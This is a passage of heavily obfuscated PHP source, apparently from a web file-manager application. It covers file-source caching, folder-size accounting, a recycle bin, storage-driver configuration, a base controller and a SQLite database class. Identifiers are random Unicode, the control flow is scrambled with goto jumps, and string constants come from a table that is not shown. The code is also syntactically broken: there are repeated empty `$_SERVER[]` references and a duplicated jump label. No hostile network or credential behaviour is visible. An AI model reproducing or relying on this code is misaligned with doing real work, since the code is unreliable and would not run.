self::$cachePathInfoMore[$e] = $dՌ; return $dՌ; goto dؘ; D􏢅: $dՌ = $this->pathInfo($e); if (!$dՌ) { return !1; } if ($dՌ[$C[397]] == $C[86]) { $dՌ[$C[80]] = $this->folderChildrenNumber($e); } goto a; aⴊ: $C =& $_SERVER[]; $A릚 = _get(self::$cachePathInfoMore, $e); if ($A릚) { return $A릚; } goto D􏢅; dؘ: } public function sourceInfo($D粢) { goto Aޜ; f: $bԔ = $d[432] . $D粢; $e嶏 = _get(self::$cacheSourceInfo, $bԔ); if ($e嶏) { return $e嶏; } goto F˭; Aޜ: $d =& $_SERVER[]; if (!$D粢) { return array(); } $D粢 = intval($D粢); goto f; F˭: $bĝ = $this->where(array($d[390] => $D粢))->find(); self::$cacheSourceInfo[$bԔ] = $bĝ; return self::$cacheSourceInfo[$bԔ]; goto DӓÏ; DӓÏ: } public function sourceCacheClear($CȝÒ = false) { self::cacheClear($CȝÒ); } public static function cacheClear($AӍ = false) { $E吨 =& $_SERVER[]; if ($AӍ == !1) { goto dܥ; eؠݶ: return; goto AԴ; dє: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto eؠݶ; dܥ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto dє; AԴ: } unset(self::$cacheSourceInfo[$E吨[432] . $AӍ]); unset(self::$cachePathInfoMore[$AӍ]); unset(self::$cachePathInfo[$E吨[1971] . $AӍ]); unset(self::$cachePathInfo[$E吨[1972] . $AӍ]); } public function metaSet($CӅ, $dɳ = null, $dö = null) { $f㌎ = parent::metaSet($CӅ, $dɳ, $dö); if ($f㌎) { $this->sourceCacheClear($CӅ); } return $f㌎; } public function pathInfoByPath($fϗ, $eٛ) { $bɒ =& $_SERVER[]; $Dӑߡ = !$eٛ ? array() : explode($bɒ[8], trim($eٛ, $bɒ[8])); $fЏ = $fϗ; foreach ($Dӑߡ as $d׎) { $bΜ = array($bɒ[472] => $fЏ, $bɒ[28] => $d׎); $Eӻ¶ = $this->where($bΜ)->select(); if (!$Eӻ¶) { return !1; } $Eӻ¶ = array_sort_by($Eӻ¶, $bɒ[417]); $fЏ = $Eӻ¶[0][$bɒ[390]]; } return $this->pathInfo($fЏ, !0); } protected function updateModifyTime($e޺ԛ) { goto c; a蔑: $this->where($dֻ)->save($EȮݦ); goto AרŇ; F: foreach ($e޺ԛ as $cļ => $F) { $e޺ԛ[$cļ] = intval($F); $this->sourceCacheClear($F); } $dֻ = array($D͔[390] => array($D͔[7], $e޺ԛ)); $EȮݦ = array($D͔[547] => USER_ID, $D͔[411] => time()); goto a蔑; c: $D͔ =& $_SERVER[]; if (!$e޺ԛ) { return; } if (!is_array($e޺ԛ)) { $e޺ԛ = array($e޺ԛ); } goto F; AרŇ: } public function folderSizeReset($AϘю, $fɇ = false) { goto bɳ; bׯ̅: if ($fɇ == 0) { return CacheLock::unlock($Bڴ); } $BΘ = $this->parentLevelArray($eÌ[$f뭚[481]]); if (!$BΘ) { $BΘ = array(); } goto Dᘵ; bɳ: $f뭚 =& $_SERVER[]; if ($this->statusIgnoreResetSpace) { return; } $eÌ = $this->sourceInfo($AϘю); goto bԜ; Dᘵ: $BΘ[] = $eÌ[$f뭚[390]]; $a = array($f뭚[390] => array($f뭚[405], $BΘ)); if ($fɇ < 0) { $a[$f뭚[77]] = array($f뭚[972], abs($fɇ)); } goto a; bԜ: $Bڴ = $f뭚[1973] . $AϘю; CacheLock::lock($Bڴ, 20); if ($fɇ === !1) { $this->sourceCacheClear($AϘю); $eÌ = $this->sourceInfo($AϘю); $a = array($f뭚[389] => $AϘю, $f뭚[416] => 0); $fќ = $this->where($a)->sum($f뭚[77]); $fɇ = intval($fќ) - intval($eÌ[$f뭚[77]]); } goto bׯ̅; a: $this->where($a)->setAdd($f뭚[77], $fɇ); CacheLock::unlock($Bڴ); $C = $f뭚[1974] . $eÌ[$f뭚[398]] . $f뭚[4] . $eÌ[$f뭚[478]]; goto dđ; dđ: $eܚ = array($eÌ[$f뭚[398]], $eÌ[$f뭚[478]]); TaskRun::timeLimitCall($C, $f뭚[1975], $eܚ, 1.5); goto Aݙץ; Aݙץ: } public function folderSizeResetChildren($b) { goto A薡; E掋: foreach ($e  as $D) { if ($D[$b酟[77]] == $D[$b酟[1977]]) { continue; } $F[] = array($b酟[390], $D[$b酟[390]], $b酟[77], $D[$b酟[77]]); } $this->saveAll($F); goto eǾŸ; f: $d = array($b酟[541] => 1, $b酟[548] => array($b酟[507], $F[$b酟[481]] . $b . $b酟[508])); $bЍ = $b酟[1976]; $e  = $this->field($bЍ)->where($d)->select(); goto c̑; Eںа: foreach ($A΍ͻ as $D) { $c = $D[$b酟[472]] . $b酟[33]; if (!isset($e [$c])) { continue; } if ($D[$b酟[417]] == $e [$c][$b酟[417]]) { $e [$c][$b酟[77]] += $D[$b酟[77]]; } } foreach ($e  as $D) { $Bȥ = $this->parentLevelArray($D[$b酟[481]]); foreach ($Bȥ as $c) { $c = $c . $b酟[33]; if (!isset($e [$c])) { continue; } if ($D[$b酟[417]] == $e [$c][$b酟[417]]) { $e [$c][$b酟[77]] += $D[$b酟[77]]; } } } $F = array(); goto E掋; E嘉: $e [] = $F; $e  = array_to_keyvalue($e , $b酟[390]); foreach ($e  as $b˯ => $D) { $e [$b˯][$b酟[1977]] = $e [$b˯][$b酟[77]]; $e [$b˯][$b酟[77]] = 0; } goto Eںа; A薡: $b酟 =& $_SERVER[]; $this->sourceCacheClear($b); $F = $this->sourceInfo($b); goto f; c̑: $d[$b酟[397]] = 0; $A΍ͻ = $this->field($bЍ)->where($d)->select(); if (!$A΍ͻ) { return; } goto E嘉; eǾŸ: } public function userSpaceReset($b = false) { $fܯ =& $_SERVER[]; $A͠ = $this->where(array($fܯ[398] => self::TYPE_USER, $fܯ[478] => $b, $fܯ[397] => 0))->sum($fܯ[77]); $A͠ = !$A͠ || $A͠ <= 0 ? 0 : $A͠; Model($fܯ[497])->userEdit($b, array($fܯ[1672] => $A͠)); } public function targetSpaceUpdate($f, $a) { $aԿ =& $_SERVER[]; if (!$a) { return; } if (!in_array($f, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Aߑ = $this->targetSpaceSize($f, $a); if ($f == self::TYPE_USER) { Model($aԿ[497])->userEdit($a, array($aԿ[1672] => $Aߑ)); } else { if ($f == self::TYPE_GROUP) { Model($aԿ[480])->groupEdit($a, array($aԿ[1672] => $Aߑ)); } } } public function targetSpaceSize($Fレ, $FÑ) { goto cБ䋥; cБ䋥: $C =& $_SERVER[]; $b = $this->sourceRoot($Fレ, $FÑ, !0); if (!$b) { return 0; } goto a΍; a΍: $Eʕ = floatval($b[$C[77]]); $A = array($C[548] => array($C[507], $C[493] . $b[$C[390]] . $C[508])); $F١ = Model($C[415])->field($C[404])->where($A)->select(); goto eȕ; eȕ: $F١ = array_to_keyvalue($F١, $C[33], $C[390]); $F١ = array_unique(array_filter($F١)); if ($F١) { $A = array($C[404] => array($C[405], $F١)); $Eʕ += floatval($this->where($A)->sum($C[77])); } goto eǏ; eǏ: $Eʕ = !$Eʕ || $Eʕ <= 0 ? 0 : $Eʕ; return $Eʕ; goto BՆ; BՆ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($D) { return $this->fileTypeProfile($D, SourceModel::TYPE_USER); } public function groupFileTypeProfile($B沗԰) { return $this->fileTypeProfile($B沗԰, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Fψ, $C࿵) { goto Cˍ; dϮ: foreach ($D뻍 as $C => $fͫ) { $Eء[$A[399]] = $this->fileTypeWhere($C); $eÆ[$C] = array($A[1980] => $fͫ[$A[28]], $A[1981] => $this->where($Eء)->count(), $A[543] => $this->where($Eء)->sum($A[77])); } Cache::set($BȻ, $eÆ, 1200); return $eÆ; goto D; Cˍ: $A =& $_SERVER[]; $BȻ = $A[1978] . $Fψ . $A[70] . $C࿵; $E = Cache::get($BȻ); goto A뉜; d͊: $eÆ = array(); $eÆ[$A[1979]] = array($A[1980] => LNG($A[1979]), $A[1981] => $this->where($Eء)->count(), $A[543] => $this->where($Eء)->sum($A[77])); $D뻍 = KodIO::fileTypeList(); goto dϮ; A뉜: if ($E) { return $E; } $Eء = array($A[541] => 0); if ($Fψ != !1) { $Eء[$A[478]] = $Fψ; $Eء[$A[398]] = $C࿵; } goto d͊; D: } public function fileNameExist($A, $FŹ) { $Aه =& $_SERVER[]; $F򩣋 = $this->childList($A); foreach ($F򩣋 as $Bଙˣ) { if ($Bଙˣ[$Aه[28]] == $FŹ) { return $Bଙˣ[$Aه[390]]; } if (strtolower($Bଙˣ[$Aه[28]]) == strtolower($FŹ)) { return $Bଙˣ[$Aه[390]]; } } return !1; } public function childList($b) { goto d; c朡: self::$cacheChildList[$Bݼ] = $aއ; foreach ($aއ as $Fʹʲ) { $Bݼ = $a[432] . $Fʹʲ[$a[390]]; self::$cacheSourceInfo[$Bݼ] = $Fʹʲ; } return $aއ; goto cԣ; B: $B = array($a[472] => intval($b), $a[417] => 0); $aއ = $this->where($B)->select(); $aއ = $aއ ? $aއ : array(); goto c朡; d: $a =& $_SERVER[]; $Bݼ = $a[1956] . $b; if (isset(self::$cacheChildList[$Bݼ])) { return self::$cacheChildList[$Bݼ]; } goto B; cԣ: } public function fileNameAuto($e⋜, $E, $eǙ = REPEAT_RENAME, $Fˋ = false) { $bا =& $_SERVER[]; $f˖ = $this->childList($e⋜); $A = array_to_keyvalue($f˖, $bا[33], $bا[28]); return $this->fileNameAutoGet($A, $E, $eǙ, $Fˋ); } public function fileNameAutoGet($f, $F푨, $Cٔ, $d) { $aٰ =& $_SERVER[]; if ($Cٔ == REPEAT_REPLACE || !$f || !in_array_not_case($F푨, $f) || $d && $Cٔ != REPEAT_RENAME_FOLDER) { return $F푨; } if ($Cٔ == REPEAT_SKIP) { return !1; } $D = $aٰ[94] . get_path_ext($F푨); $D = $D == $aٰ[94] || $d ? $aٰ[33] : $D; for ($bޟ = 1; $bޟ <= count($f) + 1; $bޟ++) { $F = substr($F푨, 0, strlen($F푨) - strlen($D)); $Aɚ = $F . "\50{$bޟ}\51{$D}"; if (!in_array_not_case($Aɚ, $f)) { return $Aɚ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\x63\145\137\x72\145\143\171\143\x6c\x65"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\124\151\x6d\145", "\x74\x69\x6d\145", "\151\156\x73\x65\162\x74", "\146\165\156\x63\164\x69\x6f\156")); public function listData($bъ = false) { $B =& $_SERVER[]; $bъ = $bъ ? $bъ : USER_ID; $b = $this->where(array($B[1515] => $bъ))->select(); return array_to_keyvalue($b, $B[33], $B[390]); } public function moveToRecycle($D啣Ǳ) { goto Cง©; F: if (!$Eܞ || $Eܞ[$fΥǄ[417]] == $fΥǄ[86]) { return; } $bŦ = array($fΥǄ[404] => $D啣Ǳ, $fΥǄ[1515] => USER_ID, $fΥǄ[544] => $Eܞ[$fΥǄ[398]], $fΥǄ[545] => $Eܞ[$fΥǄ[478]], $fΥǄ[548] => $Eܞ[$fΥǄ[481]]); $this->add($bŦ); goto D; Cง©: $fΥǄ =& $_SERVER[]; $Aٙ = Model($fΥǄ[1203]); $Eܞ = $Aٙ->sourceInfo($D啣Ǳ); goto F; D: $this->recycleMove($D啣Ǳ, 1); if ($Eܞ[$fΥǄ[397]] == $fΥǄ[86]) { $DҌ = array($fΥǄ[548] => array($fΥǄ[507], $Eܞ[$fΥǄ[481]] . $D啣Ǳ . $fΥǄ[508])); $Aٙ->where($DҌ)->setField($fΥǄ[417], 1); } goto F; F: } public function clear() { $this->remove(!1); } public function remove($b͍ = false) { goto FӬ; FӬ: $b =& $_SERVER[]; $Eَ = Model($b[1203]); $C̴ = $this->listData(); goto b񘷈; fͶ: foreach ($f as $ë) { $Eَ->targetSpaceUpdate($ë[$b[398]], $ë[$b[478]]); } goto Eо׬; b񘷈: $b͍ = $b͍ === !1 ? !1 : $b͍; $f = array(); foreach ($C̴ as $a) { if ($b͍ != !1 && !in_array($a, $b͍)) { continue; } $c҂ = $Eَ->sourceInfo($a); $Eَ->remove($a, !1); $fҙ = $c҂[$b[398]] . $b[70] . $c҂[$b[478]]; $f[$fҙ] = array($b[544] => $c҂[$b[398]], $b[478] => $c҂[$b[478]]); $this->where(array($b[390] => $a))->delete(); } goto fͶ; Eо׬: } public function restore($B͈ = false) { $fԻǲ = $this->listData(); $this->_restoreSource($fԻǲ, $B͈); } public function restoreUserAll($F㉏) { $b = $this->listData($F㉏); $this->_restoreSource($b, !1); } private function _restoreSource($BԒ, $E׭) { goto Dꮉ; Dꮉ: $FȠ䫰 =& $_SERVER[]; $A͓ = Model($FȠ䫰[1203]); $E׭ = $E׭ == !1 ? !1 : $E׭; goto bƅ; dӧƉ: $A͓->updateModifyTime($aδ); goto F˅댝; bƅ: if (!$BԒ) { return !0; } $aδ = array(); foreach ($BԒ as $Aј) { goto Fǂ; Bߢ: $aδ[] = $E[$FȠ䫰[472]]; if ($E[$FȠ䫰[397]] == $FȠ䫰[86]) { $aδ[] = $Aј; } $A͓->lockMoveEnd($Aј); goto DȖ; F: if ($E[$FȠ䫰[397]] == $FȠ䫰[86]) { $cԅ = array($FȠ䫰[548] => array($FȠ䫰[507], $E[$FȠ䫰[481]] . $Aј . $FȠ䫰[508])); $A͓->where($cԅ)->setField($FȠ䫰[417], 0); $this->restoreFolderChildren($Aј, $BԒ); } $this->where(array($FȠ䫰[390] => $Aј))->delete(); $A͓->folderSizeReset($E[$FȠ䫰[472]]); goto Bߢ; E⋎: if ($BɆ[$FȠ䫰[417]] == $FȠ䫰[86]) { continue; } $A͓->lockMoveStart($Aј); $this->recycleMove($Aј, 0); goto F; Fǂ: if ($E׭ != !1 && !in_array($Aј, $E׭)) { continue; } $E = $A͓->sourceInfo($Aј); $BɆ = $A͓->sourceInfo($E[$FȠ䫰[472]]); goto E⋎; DȖ: } goto dӧƉ; F˅댝: } private function restoreFolderChildren($fۋ, $Dя) { goto Dܣǐ; dѴ⢋: $FƱݚ[$C[390]][1] = array_unique($FƱݚ[$C[390]][1]); $FƱݚ[$C[957]] = $C[1774]; $Eƌ->where($FƱݚ)->setField($C[417], 1); goto A΍؂; C݆: foreach ($Dя as $EѢ) { if ($EѢ == $fۋ) { continue; } if (!$Eƌ->isParentOf($fۋ, $EѢ)) { continue; } $Bƽ = $Eƌ->sourceInfo($EѢ); if ($Bƽ[$C[397]] == $C[86]) { $FƱݚ[] = array($C[548] => array($C[507], $Bƽ[$C[481]] . $EѢ . $C[508])); } else { $FƱݚ[$C[390]][1][] = $EѢ; } } if (!$FƱݚ[$C[390]][1]) { unset($FƱݚ[$C[390]]); } if (!$FƱݚ) { return; } goto dѴ⢋; Dܣǐ: $C =& $_SERVER[]; $Eƌ = Model($C[1203]); $FƱݚ = array($C[390] => array($C[7], array())); goto C݆; A΍؂: } private function recycleMove($D皢ۊ, $A = 1) { $bٜЕ =& $_SERVER[]; $a = Model($bٜЕ[1203]); $BފŖ = Model($bٜЕ[1982]); $C = array($bٜЕ[390] => $D皢ۊ); if ($A) { $a->where($C)->setField($bٜЕ[417], 1); $BފŖ->eventRecycle($D皢ۊ, $bٜЕ[1983]); } else { $cՠ = $a->where($C)->find(); $DІ = $cՠ[$bٜЕ[397]] == $bٜЕ[86]; $dϴ = $a->fileNameAuto($cՠ[$bٜЕ[472]], $cՠ[$bٜЕ[28]], REPEAT_RENAME_FOLDER, $DІ); if ($dϴ != $cՠ[$bٜЕ[28]]) { $a->rename($D皢ۊ, $dϴ); } $a->where($C)->setField($bٜЕ[417], 0); $BފŖ->eventRecycle($D皢ۊ, $bٜЕ[1984]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\163\x74\x6f\x72\141\x67\x65\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\163\x69\172\x65\x4d\141\x78", "\x73\x79\x73\x74\145\x6d", "\x64\145\x66\x61\x75\x6c\x74", "\144\x72\x69\166\x65\162", "\143\157\156\x66\151\x67"); public function listData($cާ = false, $aӶȾ = "\x6d\x6f\x64\151\146\171\x54\x69\x6d\x65", $Dӿ = false) { $b =& $_SERVER[]; $D = parent::listData($cާ, $aӶȾ, $Dӿ); if ($cާ) { return $D; } $F = $this->ioSizeUseGet(array_to_keyvalue($D, $b[33], $b[388])); foreach ($D as $Fǿ => $dґӻ) { unset($D[$Fǿ][$b[6]]); $D[$Fǿ][$b[1672]] = isset($F[$dґӻ[$b[388]]]) ? $F[$dґӻ[$b[388]]] : 0; } return $D; } public function ioSizeUseGet($d) { goto dҧÆ; Cȩ: $D̓褋 = Cache::get($f͜׆); if ($D̓褋) { return $D̓褋; } $E܍ = array($c湼Ñ[783] => $c湼Ñ[388], $c湼Ñ[1986] => $c湼Ñ[77]); goto DθĢ; dҧÆ: $c湼Ñ =& $_SERVER[]; if (!$d) { return array(); } $f͜׆ = $c湼Ñ[1985] . implode($c湼Ñ[47], $d); goto Cȩ; D: Cache::set($f͜׆, $D̓褋, 60); return $D̓褋; goto Dᜊ; DθĢ: $f͞ = array($c湼Ñ[783] => array($c湼Ñ[7], $d)); $D̓褋 = Model($c湼Ñ[754])->field($E܍)->where($f͞)->group($c湼Ñ[783])->select(); $D̓褋 = array_to_keyvalue($D̓褋, $c湼Ñ[388], $c湼Ñ[77]); goto D; Dᜊ: } public function getConfig($bÎ҈) { $cՍ҆ = parent::listData($bÎ҈); return json_decode($cՍ҆[$_SERVER[][6]], !0); } public function update($cӑ݃Ȍ, $bۄ) { goto e߽; F҇: $Bބԟ = parent::update($cӑ݃Ȍ, $bۄ); if ($Bބԟ && $bۄ[$cؓ[34]]) { foreach ($Fە as $eҊ䆗) { if ($eҊ䆗[$cؓ[34]] && $eҊ䆗[$cؓ[388]] != $cӑ݃Ȍ) { parent::update($eҊ䆗[$cؓ[388]], array($cؓ[34] => 0)); } } } return $Bބԟ; goto C; e߽: $cؓ =& $_SERVER[]; $aܠ = $bۄ[$cؓ[28]]; $Fە = array_to_keyvalue(parent::listData(), $cؓ[28]); goto D񳅶; D񳅶: if (isset($Fە[$aܠ]) && $Fە[$aܠ][$cؓ[388]] != $cӑ݃Ȍ) { return !1; } if (isset($bۄ[$cؓ[1987]]) && $bۄ[$cؓ[1987]] == $cؓ[86]) { $this->checkConfig($bۄ); } unset($bۄ[$cؓ[1987]]); goto F҇; C: } public function add($fԋ) { goto eј; bц: $this->checkConfig($fԋ); $d = parent::insert($fԋ); if ($d && $fԋ[$FՃ[34]]) { foreach ($a曻 as $f) { if ($f[$FՃ[34]]) { parent::update($f[$FՃ[388]], array($FՃ[34] => 0)); } } } goto d; eј: $FՃ =& $_SERVER[]; $a曻 = array_to_keyvalue(parent::listData(), $FՃ[28]); if (isset($a曻[$fԋ[$FՃ[28]]])) { return !1; } goto bц; d: return $d; goto f; f: } public function checkConfig(&$aآ) { goto F; Fጐ: $aآ[$cϥғ[6]] = json_encode($f夫); $aآ[$cϥғ[93]] = $aкЉ; return !0; goto a̹; AǶ: foreach ($f夫 as $aȚ => $D) { $f夫[$aȚ] = trim($D); } $f夫[$cϥғ[1988]] = rand_string(6); $b뛠 = $GLOBALS[$cϥғ[6]][$cϥғ[87]][$cϥғ[791]]; goto Eݒ; e: $A = new $B($f夫); if (in_array($C؆, $A->objectDriver)) { if (!$A->isBucketCors() && !$A->setBucketCors()) { $A˖ = LNG($cϥғ[1992]); $A˖ .= $cϥғ[1993] . LNG($cϥғ[1994]); show_json($A˖, !1); } } $cтϩ = rtrim($f夫[$cϥғ[1075]], $cϥғ[8]) . $cϥғ[8]; goto Fː褼; Fː褼: $a싩 = $A->getPath($cтϩ . $cϥғ[1136]); if (!$A->mkfile($a싩)) { show_json(LNG($cϥғ[1992]), !1); } $f夫[$cϥғ[1075]] = $cтϩ; goto Fጐ; F: $cϥғ =& $_SERVER[]; $C؆ = strtolower($aآ[$cϥғ[93]]); $f夫 = json_decode($aآ[$cϥғ[6]], !0); goto AǶ; Eݒ: $aкЉ = isset($b뛠[$C؆]) ? $b뛠[$C؆] : ucfirst($C؆); $B = $cϥғ[71] . $aкЉ; if (!$aкЉ || !class_exists($B)) { write_log(array($cϥғ[1989], $aآ, get_caller_info()), $cϥғ[1990]); show_json(LNG($cϥғ[1991]), !1, $aآ); } goto e; a̹: } public function driverListSystem() { $E䮪 =& $_SERVER[]; $dҜ = parent::listData(); $aЃ = array(); foreach ($dҜ as $f) { unset($f[$E䮪[192]], $f[$E䮪[83]]); $f[$E䮪[6]] = json_decode($f[$E䮪[6]], !0); $aЃ[] = $f; } return $aЃ; } public function defaultDriver() { $D݃ =& $_SERVER[]; $D = parent::listData(); $e珒 = array_filter_by_field($D, $D݃[34], 1); $e珒 = $e珒[0]; if ($e珒) { $e珒[$D݃[6]] = json_decode($e珒[$D݃[6]], !0); } return $e珒; } public function driverInfo($A) { $d֩ꋭ =& $_SERVER[]; $aËܡ = array_to_keyvalue(parent::listData(), $d֩ꋭ[388]); if (!isset($aËܡ[$A])) { return !1; } $fٸ = $aËܡ[$A]; $fٸ[$d֩ꋭ[6]] = json_decode($fٸ[$d֩ꋭ[6]], !0); return $fٸ; } public function remove($cه) { $this->removeShareItems($cه); return parent::remove($cه); } public function removeWithFile($d, $b) { goto D; D: $B벅ĝ =& $_SERVER[]; $cѡю = array($B벅ĝ[783] => $d); $BĎ = Model($B벅ĝ[444])->where($cѡю)->count(); goto Bѧ; eЯɃ: $e߹->task[$B벅ĝ[734]] = (double) $E; $Aǆ = KodIO::defaultDriver(); $F삆 = $Aǆ[$B벅ĝ[388]]; goto C铫; Bѧ: $E = Model($B벅ĝ[444])->where($cѡю)->sum($B벅ĝ[77]); $a = $b . $B벅ĝ[1995] . $d; $e߹ = new TaskFileTransfer($a, $B벅ĝ[1990], $BĎ, LNG($B벅ĝ[1996]) . "\50{$d}\x29"); goto eЯɃ; C: $DӠą = Model($B벅ĝ[173])->where($cѡю)->field($B벅ĝ[1997])->select(); foreach ($DӠą as $B) { goto d㤘; d㤘: $CЃ = $B[$B벅ĝ[75]]; $d = $Eע . str_replace("\x7b\151\x6f\72{$d}\x7d\x2f", $B벅ĝ[33], $CЃ); if (!IO::exist($CЃ)) { $d̛[] = $B[$B벅ĝ[441]]; $e߹->updateFileEnd($B[$B벅ĝ[28]], $B[$B벅ĝ[77]]); continue; } goto fѿ; fѿ: if (IO::exist($d)) { $e߹->updateFileEnd($B[$B벅ĝ[28]], $B[$B벅ĝ[77]]); continue; } if (!IO::move($CЃ, get_path_father($d))) { $f = !1; break; } $cѡю = array($B벅ĝ[441] => $B[$B벅ĝ[441]]); goto FĮ; FĮ: $c杽 = array($B벅ĝ[783] => $F삆, $B벅ĝ[75] => $d); Model($B벅ĝ[173])->where($cѡю)->save($c杽); goto D׉; D׉: } $this->removeByFileID($d̛); goto CÒ; CÒ: if (!$f) { $e߹->stop($a); return !1; } $e߹->end(); if ($b == $B벅ĝ[1652]) { $this->remove($d); } goto d闍ڸ; C铫: $Eע = "\x7b\x69\x6f\x3a{$F삆}\x7d\x2f"; $f = !0; $d̛ = array(); goto C; d闍ڸ: } public function progress($aȄ, $D) { return Task::get($D . $_SERVER[][1995] . $aȄ); } private function removeByFileID($e = array()) { goto Bޑª; Bޑª: $B̊ =& $_SERVER[]; if (empty($e)) { return; } $D܋ = array($B̊[441] => array($B̊[7], $e)); goto d̦; d݈β: foreach ($Dķ as $dՃݻ) { Model($B̊[403])->removeNow($dՃݻ, !1); } goto a; d̦: $Dķ = Model($B̊[1203])->where($D܋)->field($B̊[390])->select(); if (!$Dķ) { return; } $Dķ = array_to_keyvalue($Dķ, $B̊[33], $B̊[390]); goto d݈β; a: } private function removeShareItems($bȤ) { goto fЎ; dޮ宸: Model($f[558])->remove($A볙); goto eۇˌ; f͓׋: $c = Model($f[1663])->where($aܮ)->field($f[462])->select(); if (empty($c)) { return; } $A볙 = array_to_keyvalue($c, $f[33], $f[462]); goto dޮ宸; fЎ: $f =& $_SERVER[]; $D = "\x7b\151\x6f\72{$bȤ}\x7d\x2f"; $aܮ = array($f[390] => 0, $f[1070] => array($f[378], "{$D}\45")); goto f͓׋; eۇˌ: } } goto d؊ū; c未: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto Aгæ; Aгæ: $E륃 =& $_SERVER[]; global $in, $config; $this->config =& $config; goto Eڵ; Fܝ: $this->tpl = TEMPLATE . MOD . $E륃[8]; $this->_classObjectID = mt_rand(0, 10000); goto aؕ; Eڵ: $this->in =& $in; $this->values[$E륃[6]] =& $config; $this->values[$E륃[7]] =& $in; goto Fܝ; aؕ: } public function loadClass($eߛژ) { if (1 === func_num_args()) { $this->{$eߛژ} = new $eߛژ(); } else { $F = new ReflectionClass($eߛژ); $Eٞӛ = func_get_args(); array_shift($Eٞӛ); $this->{$eߛژ} = $F->newInstanceArgs($Eٞӛ); } return $this->{$eߛژ}; } protected function assign($c䠷ӱ, $aؓ) { $this->values[$c䠷ӱ] = $aؓ; } protected function display($d֖) { ob_end_clean(); extract($this->values); require $this->tpl . $d֖; } } class DbSqliteBase extends Db { public function __construct($ë́Ҋ = '') { $Fԙ =& $_SERVER[]; if (!extension_loaded($Fԙ[9])) { think_exception(think_lang($Fԙ[10]) . $Fԙ[11]); } if (!empty($ë́Ҋ)) { if (!isset($ë́Ҋ[$Fԙ[12]])) { $ë́Ҋ[$Fԙ[12]] = 438; } $this->config = $ë́Ҋ; if (empty($this->config[$Fԙ[13]])) { $this->config[$Fԙ[13]] = array(); } } } public function connect($E㰍 = '', $F։ = 0) { $CԲʜ =& $_SERVER[]; if (!isset($this->linkID[$F։])) { goto a솬; aؾ: $this->linkID[$F։] = $d($E㰍[$CԲʜ[17]], $E㰍[$CԲʜ[12]]); if (!$this->linkID[$F։]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto Aةٹ; Aةٹ: @sqlite_busy_timeout($this->linkID[$F։], 30000); if (1 != think_config($CԲʜ[18])) { unset($this->config); } goto AԘ; a솬: if (empty($E㰍)) { $E㰍 = $this->config; } $D˭ = !empty($E㰍[$CԲʜ[13]][$CԲʜ[14]]) ? $E㰍[$CԲʜ[13]][$CԲʜ[14]] : $this->pconnect; $d = $D˭ ? $CԲʜ[15] : $CԲʜ[16]; goto aؾ; AԘ: } return $this->linkID[$F։]; } public function free() { $this->queryID = null; } public function query($Eއ) { goto a엿; fٽ: think_status($C⽧ƻ[20]); $this->queryID = sqlite_query($this->_linkID, $Eއ); $this->debug(); goto BƄ; a엿: $C⽧ƻ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E蝡; BƄ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $fЩ = $this->getAll(); return $fЩ; } goto Cϳ; E蝡: $this->queryStr = $Eއ; if ($this->queryID) { $this->free(); } think_action_status($C⽧ƻ[19], 1); goto fٽ; Cϳ: } public function execute($Fћ) { goto ẻ; E؇: if (!1 === $B꒶) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto c; Aｬ: think_status($F[20]); $B꒶ = sqlite_exec($this->_linkID, $Fћ); $this->debug(); goto E؇; ẻ: $F =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A탤; A탤: $this->queryStr = $Fћ; if ($this->queryID) { $this->free(); } think_action_status($F[21], 1); goto Aｬ; c: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F = sqlite_query($this->_linkID, $_SERVER[][23]); if (!$F) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $eժ = sqlite_query($this->_linkID, $_SERVER[][24]); if (!$eժ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $dɤڢ = array(); if ($this->numRows > 0) { for ($C𧇅 = 0; $C𧇅 < $this->numRows; $C𧇅++) { $dɤڢ[$C𧇅] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $dɤڢ; } public function getFields($D̈́ƌ) { $bӰѶ =& $_SERVER[]; $Bꥊ = $this->query($bӰѶ[25] . $D̈́ƌ . $bӰѶ[26]); $DҾ֚٘ = array(); if ($Bꥊ) { foreach ($Bꥊ as $C杢 => $B) { $DҾ֚٘[$B[$bӰѶ[27]]] = array($bӰѶ[28] => $B[$bӰѶ[27]], $bӰѶ[29] => $B[$bӰѶ[30]], $bӰѶ[31] => (bool) ($B[$bӰѶ[32]] === $bӰѶ[33]), $bӰѶ[34] => $B[$bӰѶ[35]], $bӰѶ[36] => strtolower($B[$bӰѶ[37]]) == $bӰѶ[38], $bӰѶ[39] => strtolower($B[$bӰѶ[40]]) == $bӰѶ[41]); } } return $DҾ֚٘; } public function getTables($E = '') { $B =& $_SERVER[]; $EӾ߆˲ = $this->query($B[42] . $B[43] . $B[44]); $fڟٯ = array(); foreach ($EӾ߆˲ as $bŤ => $AԄ) { $fڟٯ[$bŤ] = current($AԄ); } return $fڟٯ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $d著 =& $_SERVER[]; $F谏 = sqlite_last_error($this->_linkID); $this->error = $F谏 . $d著[4] . sqlite_error_string($F谏); if ($d著[33] != $this->queryStr) { $this->error .= LNG($d著[45]) . $this->queryStr; } 